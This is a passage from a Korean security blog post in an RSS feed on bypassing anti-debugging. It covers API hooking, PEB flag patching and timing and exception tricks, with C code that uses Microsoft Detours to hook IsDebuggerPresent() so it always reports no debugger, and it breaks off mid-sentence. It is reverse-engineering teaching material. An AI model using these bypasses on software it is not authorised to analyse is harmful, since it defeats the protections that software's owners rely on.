      <guid>https://hackyboiz.github.io/2025/03/24/OUYA77/Anti_part2/kr/</guid>
      <pubDate>Sun, 23 Mar 2025 15:45:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694; OUYA77 &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#x1F642;&lt;/p&gt;
&lt;p&gt;&amp;#xC9C0;&amp;#xB09C; &amp;#xC2DC;&amp;#xAC04;&amp;#xC5D0;&amp;#xB2</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; OUYA77 &#xC785;&#xB2C8;&#xB2E4;. &#x1F642;</p><p>&#xC9C0;&#xB09C; &#xC2DC;&#xAC04;&#xC5D0;&#xB294; </p><ul><li>&#xB514;&#xBC84;&#xAE45;: &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xB294; &#xACF3;&#xC744; &#xCC3E;&#xC544;&#xC11C; &#xBC94;&#xC704;&#xB97C; &#xC881;&#xD600;&#xAC00;&#xBA70; &#xC6D0;&#xC778;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xACE0; &#xD574;&#xACB0;&#xD558;&#xB294; &#xACFC;&#xC815;</li><li>&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;: &#xB514;&#xBC84;&#xAC70;&#xB97C; &#xD0D0;&#xC9C0;&#xD558;&#xAC70;&#xB098; &#xADF8; &#xB3D9;&#xC791;&#xC744; &#xBC29;&#xD574;&#xD558;&#xC5EC;, &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; &#xC5ED;&#xACF5;&#xD559; &#xBC0F; &#xBD84;&#xC11D;&#xC5D0; &#xCDE8;&#xC57D;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xBCF4;&#xD638;&#xD558;&#xB294; &#xAE30;&#xBC95;</li></ul><p>&#xC744; &#xACF5;&#xBD80;&#xD588;&#xC5C8;&#xC8E0;(&#xD639;&#xC2DC; &#xC544;&#xC9C1; &#xBABB;&#xBCF4;&#xC168;&#xB2E4;&#xBA74; &#x1F447; &#x314E;&#x314E;).</p><p><em>&#xC9C0;&#xB09C; &#xD30C;&#xD2B8; &#xBCF4;&#xB7EC;&#xAC00;&#xAE30;</em></p><p><a href="https://hackyboiz.github.io/2024/12/29/OUYA77/Anti_part1/kr/">[Research] Anti-Debugging Part1(KR)</a></p><p>&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95;&#xC5D0;&#xC11C;&#xB294; <strong>Static</strong>&#xACFC; <strong>Dynamic</strong> &#xB450; &#xAC00;&#xC9C0; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95;&#xC5D0; &#xB300;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. <strong>Static</strong> &#xAE30;&#xBC95;&#xC740; &#xB514;&#xBC84;&#xAC70;&#xAC00; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC5F0;&#xACB0;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC2DC;&#xC2A4;&#xD15C; &#xC815;&#xBCF4;&#xB098; API&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, Windows&#xC5D0;&#xC11C;&#xB294; <code>IsDebuggerPresent()</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB514;&#xBC84;&#xAC70;&#xC758; &#xC874;&#xC7AC;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <strong>Dynamic</strong> &#xAE30;&#xBC95;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589; &#xC911;&#xC758; &#xD589;&#xB3D9; &#xD328;&#xD134;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB514;&#xBC84;&#xAC70;&#xB97C; &#xD0D0;&#xC9C0;&#xD558;&#xBA70;, &#xD0C0;&#xC774;&#xBC0D; &#xAE30;&#xBC18; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;-&#xBC29;&#xBC95;"><a href="#&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;-&#xBC29;&#xBC95;" class="headerlink" title="&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C; &#xBC29;&#xBC95;"></a>&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C; &#xBC29;&#xBC95;</h2><h3 id="Static-&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;"><a href="#Static-&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;" class="headerlink" title="Static &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C;"></a>Static &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C;</h3><p>Static &#xAE30;&#xBC95;&#xC740; &#xAD6C;&#xD604;&#xC774; &#xAC04;&#xB2E8;&#xD558;&#xC9C0;&#xB9CC;, &#xC0C1;&#xB300;&#xC801;&#xC73C;&#xB85C; &#xC27D;&#xAC8C; &#xC6B0;&#xD68C;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ol><li><strong>API Hooking</strong>: &#xB514;&#xBC84;&#xAC70;&#xAC00; &#xC0AC;&#xC6A9;&#xD558;&#xB294; API&#xB97C; Hooking&#xD558;&#xC5EC; API &#xD638;&#xCD9C;&#xC744; &#xAC00;&#xB85C;&#xCC44;&#xACE0;, &#xB514;&#xBC84;&#xAC70;&#xC758; &#xC874;&#xC7AC;&#xB97C; &#xC228;&#xAE38; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, Windows&#xC5D0;&#xC11C; <code>IsDebuggerPresent()</code> &#xD568;&#xC218;&#xB97C; Hooking&#xD558;&#xC5EC; &#xD56D;&#xC0C1; &#xB514;&#xBC84;&#xAC70;&#xAC00; &#xC5C6;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC751;&#xB2F5;&#xD558;&#xAC8C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><strong>PEB &#xAD6C;&#xC870;&#xCCB4; &#xC870;&#xC791;</strong>: PEB&#xC758; <code>BeingDebugged</code> &#xD544;&#xB4DC;&#xB97C; &#xC9C1;&#xC811; &#xC870;&#xC791;&#xD558;&#xC5EC; &#xB514;&#xBC84;&#xAC70;&#xC758; &#xC874;&#xC7AC;&#xB97C; &#xC228;&#xAE38; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><h3 id="Dynamic-&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;"><a href="#Dynamic-&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;" class="headerlink" title="Dynamic &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C;"></a>Dynamic &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C;</h3><p>Dynamic &#xAE30;&#xBC95;&#xC740; &#xC2E4;&#xD589; &#xC911;&#xC5D0; &#xD658;&#xACBD; &#xBCC0;&#xD654;&#xB098; &#xB3D9;&#xC801; &#xC870;&#xAC74;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xB3D9;&#xC791;&#xD558;&#xBBC0;&#xB85C;, &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xB7F0;&#xD0C0;&#xC784; &#xC0C1;&#xD669;&#xC744; &#xCDA9;&#xBD84;&#xD788; &#xC774;&#xD574;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC6B0;&#xD68C; &#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ol><li><strong>&#xD0C0;&#xC774;&#xBC0D; &#xAE30;&#xBC18; &#xC6B0;&#xD68C;</strong>: &#xD0C0;&#xC774;&#xBC0D; &#xAE30;&#xBC18; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xB97C; &#xCE21;&#xC815;&#xD558;&#xC5EC; &#xB514;&#xBC84;&#xAC70;&#xC758; &#xC874;&#xC7AC;&#xB97C; &#xD0D0;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xAE30; &#xC704;&#xD574;, IDA&#xC640; &#xAC19;&#xC740; &#xB514;&#xBC84;&#xAE45; &#xD234;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xC5EC; &#xCF54;&#xB4DC;&#xB97C; &#xD328;&#xCE58;&#xD558;&#xC5EC; &#xD0C0;&#xC774;&#xBC0D; &#xCE21;&#xC815; &#xCF54;&#xB4DC;&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><strong>&#xC608;&#xC678; &#xCC98;&#xB9AC; &#xC870;&#xC791;</strong>: Dynamic &#xAE30;&#xBC95;&#xC740; &#xC608;&#xC678; &#xBC1C;&#xC0DD; &#xC2DC; &#xB514;&#xBC84;&#xAC70;&#xC758; &#xC874;&#xC7AC;&#xB97C; &#xD0D0;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xAE30; &#xC704;&#xD574;, &#xC608;&#xC678; &#xCC98;&#xB9AC; &#xB8E8;&#xD2F4;&#xC744; &#xC870;&#xC791;&#xD558;&#xC5EC; &#xB514;&#xBC84;&#xAC70;&#xC758; &#xC874;&#xC7AC;&#xB97C; &#xC228;&#xAE38; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><h1 id="&#xC2E4;&#xC2B5;"><a href="#&#xC2E4;&#xC2B5;" class="headerlink" title="&#xC2E4;&#xC2B5;"></a>&#xC2E4;&#xC2B5;</h1><p>&#xC790;! &#xADF8;&#xB7EC;&#xBA74; &#xC774;&#xC81C; &#xC2E4;&#xC2B5;&#xC744; &#xC9C4;&#xD589;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>&#xC2E4;&#xC2B5; &#xD658;&#xACBD;</strong></p><ul><li>&#xC6B4;&#xC601;&#xCCB4;&#xC81C;: Windows 11</li><li>&#xBC14;&#xC774;&#xB108;&#xB9AC; &#xC544;&#xD0A4;&#xD14D;&#xCC98;: 32&#xBE44;&#xD2B8;</li><li>&#xB514;&#xBC84;&#xAE45; &#xB3C4;&#xAD6C;: IDA Freeware 8.4</li><li>IDE: Visual Studio 2022</li></ul><p>&#xC774; &#xD658;&#xACBD;&#xC5D0;&#xC11C; 32&#xBE44;&#xD2B8; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBE4C;&#xB4DC;&#xD558;&#xACE0; IDA Freeware&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC774; &#xC801;&#xC6A9;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xB300;&#xD574; &#xB514;&#xBC84;&#xAE45;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC744; &#xC2E4;&#xC2B5;&#xD560; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="Static-&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;-&#xC2E4;&#xC2B5;"><a href="#Static-&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;-&#xC2E4;&#xC2B5;" class="headerlink" title="Static &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C; &#xC2E4;&#xC2B5;"></a>Static &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C; &#xC2E4;&#xC2B5;</h2><h3 id="1-&#xC77C;&#xBC18;-&#xD504;&#xB85C;&#xADF8;&#xB7A8;"><a href="#1-&#xC77C;&#xBC18;-&#xD504;&#xB85C;&#xADF8;&#xB7A8;" class="headerlink" title="1. &#xC77C;&#xBC18; &#xD504;&#xB85C;&#xADF8;&#xB7A8;"></a>1. &#xC77C;&#xBC18; &#xD504;&#xB85C;&#xADF8;&#xB7A8;</h3><p>&#x201C;Part 1&#x201D;&#xC5D0;&#xC11C;&#xB3C4; &#xBD24;&#xB4EF;&#xC774; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC774; &#xC801;&#xC6A9;&#xB41C; &#xC77C;&#xBC18; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Visual Studio 2022&#xC5D0;&#xC11C; &#xBE48; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC8FC;&#xC2DC;&#xACE0; main.cpp&#xB97C; &#xB9CC;&#xB4E0; &#xD6C4; x86&#xC73C;&#xB85C; &#xBE4C;&#xB4DC;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p><p><img src="image.png" alt="image.png"></p><pre><code class="hljs c"><span class="hljs-comment">// main.cpp</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{    <span class="hljs-keyword">if</span> (IsDebuggerPresent()) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Debugger detected!\n&quot;</span>);    }    <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No debugger found.\n&quot;</span>);    }    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xBE4C;&#xB4DC; &#xD6C4; exe&#xAC00; &#xC0DD;&#xC131;&#xB41C; &#xD3F4;&#xB354;(./Debug)&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xC11C; &#xBE4C;&#xB4DC;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; <code>No debugger found.</code> &#xAC00; &#xB739;&#xB2C8;&#xB2E4;.</p><p><img src="image%201.png" alt="image.png"></p><p>&#xC774;&#xC81C; IDA Freeware&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xB514;&#xBC84;&#xAE45;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. IDA&#xC5D0; &#xBD88;&#xB7EC;&#xC640; F9&#xB97C; &#xB20C;&#xB7EC; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC2DC;&#xB3C4;&#xD558;&#xBA74;..!!</p><p><img src="image%202.png" alt="image.png"></p><p>&#xC704;&#xC640; &#xAC19;&#xC774; <code>IsDebuggerPresent()</code> &#xD568;&#xC218;&#xC5D0; &#xC758;&#xD574; &#xB514;&#xBC84;&#xAC70;&#xAC00; &#xAC10;&#xC9C0;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xBB38;&#xC7A5;&#xC774; &#xB098;&#xC635;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; <code>IsDebuggerPresent()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xD0D0;&#xC9C0;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xB9CC;&#xC57D; &#xC774; &#xD568;&#xC218;&#xAC00; &#xC81C; &#xAE30;&#xB2A5;&#xC744; &#xBABB;&#xD55C;&#xB2E4;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xB420;&#xAE4C;&#xC694;?! &#xC774;&#xC81C; &#x201C;API Hooking&#x201D;&#xC744; &#xD1B5;&#xD574; Static &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xC2E4;&#xC2B5;&#xC744; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="2-API-Hooking-&#xC2E4;&#xC2B5;-Bypass-Static-Anti-Debugging"><a href="#2-API-Hooking-&#xC2E4;&#xC2B5;-Bypass-Static-Anti-Debugging" class="headerlink" title="2. API Hooking &#xC2E4;&#xC2B5; (Bypass Static Anti-Debugging)"></a><strong>2. API Hooking &#xC2E4;&#xC2B5; (Bypass Static Anti-Debugging)</strong></h3><p>API Hooking &#xC2E4;&#xC2B5;&#xC740; Microsoft Detours &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xD1B5;&#xD574; &#xC9C4;&#xD589;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB294; Windows&#xC5D0;&#xC11C; API &#xD568;&#xC218;&#xB97C; Hooking&#xD558;&#xC5EC; &#xB514;&#xBC84;&#xAC70;&#xC758; &#xC874;&#xC7AC;&#xB97C; &#xC228;&#xAE38; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xB3C4;&#xC640;&#xC90D;&#xB2C8;&#xB2E4;. </p><p>&#xBA3C;&#xC800; Detours &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC124;&#xCE58;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><ol><li><p><a href="https://github.com/microsoft/detours">https://github.com/microsoft/detours</a> &#xC5D0;&#xC11C; &#xC555;&#xCD95;&#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4;&#xBC1B;&#xC740; &#xD6C4;&#xC5D0; &#xC6D0;&#xD558;&#xB294; &#xD3F4;&#xB354;&#xC5D0; &#xB123;&#xC740; &#xD6C4; &#xD574;&#xC81C;&#xD574; &#xC8FC;&#xC138;&#xC694;.</p><p> <img src="image%203.png" alt="image.png"></p></li><li><p>Visual Studio 2022&#xC5D0;&#xC11C; &#xD130;&#xBBF8;&#xB110;&#xC744; &#xCF2D;&#xB2C8;&#xB2E4;.</p><p> <img src="image%204.png" alt="image.png"></p></li><li><p><code>nmake</code> &#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xB97C; &#xBE4C;&#xB4DC;&#xD558;&#xBA74; bin, include, lib &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xAC00; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><p> <img src="image%205.png" alt="image.png"></p><p> <img src="image%206.png" alt="image.png"></p></li></ol><ol><li><p>Visual Studio&#xC5D0;&#xC11C; <code>&#xD504;&#xB85C;&#xC81D;&#xD2B8;&gt;&#xC18D;&#xC131;</code> &#xC73C;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00; &#xAD6C;&#xC131;&#xC740; &#x201C;&#xBAA8;&#xB4E0; &#xAD6C;&#xC131;&#x201D;, &#xD50C;&#xB7AB;&#xD3FC;&#xC740; &#x201C;Win32&#x201D;&#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;.</p><p> <img src="image%207.png" alt="image.png"></p></li><li><p>Detours &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; Visual Studio&#xC5D0; &#xCD94;&#xAC00;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><ul><li><p><strong>C/C++ &#xC18D;&#xC131;&#xC5D0;&#xC11C; &#xCD94;&#xAC00; &#xD3EC;&#xD568; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC124;&#xC815;</strong></p><ol><li>&#xD504;&#xB85C;&#xC81D;&#xD2B8; &#xC18D;&#xC131; &#xCC3D;&#xC5D0;&#xC11C; &#x201C;C/C++&#x201D; &#xD0ED;&#xC744; &#xC120;&#xD0DD;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#x201C;&#xC77C;&#xBC18;&#x201D; &#xD558;&#xC704; &#xBA54;&#xB274;&#xC5D0;&#xC11C; &#x201C;&#xCD94;&#xAC00; &#xD3EC;&#xD568; &#xB514;&#xB809;&#xD130;&#xB9AC;&#x201D; &#xD56D;&#xBAA9;&#xC744; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><p>&#x201C;&#xCD94;&#xAC00; &#xD3EC;&#xD568; &#xB514;&#xB809;&#xD130;&#xB9AC;&#x201D; &#xD544;&#xB4DC;&#xC5D0;&#xC11C; Detours&#xC758; include &#xACBD;&#xB85C;&#xB97C; &#xC785;&#xB825;&#xD569;&#xB2C8;&#xB2E4;:</p><p> <code>C:\Users\OUYA77\Desktop\Detours-main\include</code></p></li><li><p>&#x201C;&#xD655;&#xC778;&#x201D; &#xBC84;&#xD2BC;&#xC744; &#xD074;&#xB9AD;&#xD558;&#xC5EC; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC744; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ol></li><li><p><strong>&#xB9C1;&#xCEE4; &#xC18D;&#xC131;&#xC5D0;&#xC11C; &#xCD94;&#xAC00; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC124;&#xC815;</strong></p><ol><li>&#xD504;&#xB85C;&#xC81D;&#xD2B8; &#xC18D;&#xC131; &#xCC3D;&#xC5D0;&#xC11C; &#x201C;&#xB9C1;&#xCEE4;&#x201D; &#xD0ED;&#xC744; &#xC120;&#xD0DD;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#x201C;&#xC77C;&#xBC18;&#x201D; &#xD558;&#xC704; &#xBA54;&#xB274;&#xC5D0;&#xC11C; &#x201C;&#xCD94;&#xAC00; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xB514;&#xB809;&#xD130;&#xB9AC;&#x201D; &#xD56D;&#xBAA9;&#xC744; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><p>&#x201C;&#xCD94;&#xAC00; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xB514;&#xB809;&#xD130;&#xB9AC;&#x201D; &#xD544;&#xB4DC;&#xC5D0;&#xC11C; Detours&#xC758; lib &#xACBD;&#xB85C;&#xB97C; &#xC785;&#xB825;&#xD569;&#xB2C8;&#xB2E4;:</p><p> <code>C:\Users\OUYA77\Desktop\Detours-main\lib</code></p></li><li><p>&#x201C;&#xD655;&#xC778;&#x201D; &#xBC84;&#xD2BC;&#xC744; &#xD074;&#xB9AD;&#xD558;&#xC5EC; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC744; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ol></li></ul></li></ol><p>&#xB124; &#xC774;&#xC81C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC900;&#xBE44;&#xAC00; &#xB418;&#xC5C8;&#xC73C;&#xBA74; dllmain.cpp&#xB97C; &#xC120;&#xC5B8;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p><pre><code class="hljs c"><span class="hljs-comment">// dllmain.cpp</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;detours.lib&quot;</span>)</span></code></pre><p>&#xC774;&#xC81C; &#xC9C4;&#xC9DC;&#xB85C; Detours&#xB97C; &#xC0AC;&#xC6A9;&#xD574; <strong><code>IsDebuggerPresent()</code></strong> &#xD568;&#xC218;&#xB97C; Hooking&#xD558;&#xC5EC; Static Anti-Debugging &#xC744; &#xC6B0;&#xD68C;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// main.cpp</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;detours.h&gt;</span></span><span class="hljs-comment">// IsDebuggerPresent() &#xD568;&#xC218;&#xB97C; Hooking&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD568;&#xC218;</span><span class="hljs-function">BOOL WINAPI <span class="hljs-title">HookedIsDebuggerPresent</span><span class="hljs-params">()</span> </span>{    <span class="hljs-keyword">return</span> FALSE; <span class="hljs-comment">// &#xD56D;&#xC0C1; &#xB514;&#xBC84;&#xAC70;&#xAC00; &#xC5C6;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC751;&#xB2F5;</span>}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{    <span class="hljs-comment">// IsDebuggerPresent() &#xD568;&#xC218;&#xB97C; Hooking</span>    HMODULE hKernel32 = GetModuleHandleA(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);    <span class="hljs-keyword">if</span> (hKernel32) {        FARPROC pIsDebuggerPresent = GetProcAddress(hKernel32, <span class="hljs-string">&quot;IsDebuggerPresent&quot;</span>);        <span class="hljs-keyword">if</span> (pIsDebuggerPresent) {            <span class="hljs-comment">// Detours &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; Hooking</span>            DetourTransactionBegin();            DetourUpdateThread(GetCurrentThread());            DetourAttach(&amp;(PVOID&amp;)pIsDebuggerPresent, HookedIsDebuggerPresent);            DetourTransactionCommit();        }    }    <span class="hljs-comment">// &#xD14C;&#xC2A4;&#xD2B8;</span>    <span class="hljs-keyword">if</span> (IsDebuggerPresent()) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Debugger detected!\n&quot;</span>);    }    <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No debugger found.\n&quot;</span>);    }    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC704; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xB97C; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xBE4C;&#xB4DC; &#xD6C4; &#xC804;&#xACFC; 